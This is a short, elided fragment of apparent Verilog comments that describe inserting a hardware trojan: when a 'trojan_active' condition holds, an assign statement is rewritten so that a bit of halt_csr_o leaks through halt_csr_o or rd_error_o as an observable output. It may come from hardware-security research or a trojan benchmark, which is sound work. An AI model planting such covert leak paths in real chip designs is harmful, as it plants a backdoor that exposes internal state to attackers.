 ...
 * Payload: Route halt_csr_o[0] to observable output
 * 
...
//   Find the assign for halt_csr_o (or rd_error_o as fallback):
//     assign halt_csr_o = <normal_expr>;
//   Replace with:
//     assign halt_csr_o = trojan_active ? halt_csr_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? halt_csr_o[0] : 1'b0;
//
